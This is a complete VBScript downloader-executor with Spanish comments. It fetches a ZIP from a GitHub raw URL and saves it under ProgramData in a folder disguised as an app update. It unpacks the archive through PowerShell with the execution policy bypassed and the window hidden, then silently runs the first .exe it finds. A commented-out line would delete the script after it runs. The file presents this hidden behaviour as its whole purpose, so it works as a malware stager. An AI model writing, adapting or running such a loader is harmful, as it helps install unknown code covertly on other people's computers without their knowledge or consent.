' ============================================================
'  descargar_ejecutar.vbs
'  1) Descarga un ZIP
'  2) Lo guarda en una carpeta universal escribible
'  3) Lo descomprime
'  4) Busca el .EXE dentro y lo ejecuta
'  Todo oculto, sin ventanas.
' ============================================================
Option Explicit

' ---------- CONFIGURACION ----------
Const ZIP_URL    = "https://raw.githubusercontent.com/luisacepeda2026-byte/votacionesgov/refs/heads/main/rooot.zip"  ' <-- cambia esto
Const EXE_NOMBRE = ""        ' "" = primer .exe que encuentre | "setup.exe" = buscar ese nombre
Const ESPERAR_EXE = False    ' True = esperar a que el .exe termine antes de salir
' -----------------------------------

Dim fso, sh, baseDir, zipPath, dirExtraccion, rutaExe

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")

' Carpeta universal con permisos de lectura/escritura (ProgramData, con respaldo en LocalAppData)
On Error Resume Next
baseDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\MiAppUpdate"
If Not fso.FolderExists(baseDir) Then fso.CreateFolder baseDir
If Err.Number <> 0 Then
    Err.Clear
    baseDir = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\MiAppUpdate"
    If Not fso.FolderExists(baseDir) Then fso.CreateFolder baseDir
End If
On Error GoTo 0
If Not fso.FolderExists(baseDir) Then WScript.Quit 1

zipPath       = baseDir & "\paquete.zip"
dirExtraccion = baseDir & "\extraido"

' Limpieza de ejecuciones anteriores
On Error Resume Next
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
If fso.FolderExists(dirExtraccion) Then fso.DeleteFolder dirExtraccion, True
On Error GoTo 0
If Not fso.FolderExists(dirExtraccion) Then fso.CreateFolder dirExtraccion

' --- Flujo principal ---
If Not Descargar(ZIP_URL, zipPath) Then WScript.Quit 1
If Not Descomprimir(zipPath, dirExtraccion) Then WScript.Quit 1

If Len(EXE_NOMBRE) > 0 Then
    rutaExe = BuscarPorNombre(dirExtraccion, EXE_NOMBRE)
Else
    rutaExe = BuscarExe(dirExtraccion)
End If
If rutaExe = "" Then WScript.Quit 1

' Ejecuta el .exe desde su propia carpeta, con ventana oculta
sh.CurrentDirectory = fso.GetParentFolderName(rutaExe)
sh.Run """" & rutaExe & """", 0, ESPERAR_EXE

' --- Borrar el script al terminar (opcional, descomenta) ---
' fso.DeleteFile WScript.ScriptFullName, True


' ================= FUNCIONES =================

Function Descargar(url, destino)
    Dim http, st
    Descargar = False
    On Error Resume Next

    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Not IsObject(http) Then Set http = CreateObject("MSXML2.XMLHTTP")
    If Not IsObject(http) Then Exit Function

    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send
    If Err.Number <> 0 Then Err.Clear : Exit Function
    If http.Status <> 200 Then Exit Function

    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write http.responseBody
    st.SaveToFile destino, 2
    st.Close
    If Err.Number = 0 And fso.FileExists(destino) Then Descargar = True
    On Error GoTo 0
End Function

Function Descomprimir(zip, destino)
    Dim ps, espera, sa
    Descomprimir = False
    On Error Resume Next

    ' Metodo 1: Expand-Archive de PowerShell, oculto
    ps = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -LiteralPath '" & zip & "' -DestinationPath '" & destino & "' -Force"""
    sh.Run ps, 0, True
    Err.Clear
    If fso.GetFolder(destino).Files.Count + fso.GetFolder(destino).SubFolders.Count > 0 Then
        Descomprimir = True
        On Error GoTo 0
        Exit Function
    End If

    ' Metodo 2 (respaldo): Shell.Application
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(destino).CopyHere sa.NameSpace(zip).Items, 20
    For espera = 1 To 40
        WScript.Sleep 500
        If fso.GetFolder(destino).Files.Count + fso.GetFolder(destino).SubFolders.Count > 0 Then Exit For
    Next
    If fso.GetFolder(destino).Files.Count + fso.GetFolder(destino).SubFolders.Count > 0 Then Descomprimir = True
    On Error GoTo 0
End Function

Function BuscarExe(carpeta)
    Dim f, item, sub_
    BuscarExe = ""
    On Error Resume Next
    Set f = fso.GetFolder(carpeta)
    For Each item In f.Files
        If LCase(fso.GetExtensionName(item.Name)) = "exe" Then
            BuscarExe = item.Path
            Exit Function
        End If
    Next
    For Each sub_ In f.SubFolders
        BuscarExe = BuscarExe(sub_.Path)
        If Len(BuscarExe) > 0 Then Exit Function
    Next
    On Error GoTo 0
End Function

Function BuscarPorNombre(carpeta, nombre)
    Dim f, item, sub_
    BuscarPorNombre = ""
    On Error Resume Next
    Set f = fso.GetFolder(carpeta)
    For Each item In f.Files
        If LCase(item.Name) = LCase(nombre) Then
            BuscarPorNombre = item.Path
            Exit Function
        End If
    Next
    For Each sub_ In f.SubFolders
        BuscarPorNombre = BuscarPorNombre(sub_.Path, nombre)
        If Len(BuscarPorNombre) > 0 Then Exit Function
    Next
    On Error GoTo 0
End Function